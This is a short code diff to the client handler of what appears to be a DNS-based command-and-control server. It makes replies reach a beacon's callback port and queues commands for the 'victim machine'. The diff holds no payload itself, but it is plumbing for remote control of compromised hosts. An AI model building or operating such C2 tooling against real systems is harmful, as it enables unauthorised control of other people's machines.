@@ -12,13 +12,40 @@ class IndividualClientHandler(BaseRequestHandler):
 
         # The model that tracks each controlled machine
         self.protocol_handler = handler or handlers.dns.DNSHandler(
-            client_address[0], client_address[1], request[1]
+            client_address[0], request[1]
         )
 
+    def update_handler(self, request,  client_address):
+        """
+        Update this instance to use the new request and socket
+        parameters. Originally :module: socketserver.UDPServer
+        would create a new instance for each request, this
+        method must be called or the request will be sent
+        to the previous temporary port used by the beacon
+        to call back
+        :param request: the request received by the server
+        :param client_address: tuple of (IP, port)
+        :return: None
+        """
+        self.client_address = client_address
+        self.request = request
 
     def handle(self):
-        self.protocol_handler.handle_request(self.request)
-
+        """
+        The method required by BaseRequestHandler that handles the
+        incoming request
+        :return:  None
+        """
+        _, port = self.client_address
+        self.protocol_handler.handle_request(self.request, port)
 
     def queue_command(self, ctype, cmd):
+        """
+        The server method used to interact with the underyling
+        model representing the victim machine. Will queue a
+        command to be sent next time the beacon calls back
+        :param ctype: type of command :module: protocolhandler.Commands
+        :param cmd: the command to be sent
+        :return: None
+        """
         self.protocol_handler.queue_cmd(ctype, cmd)
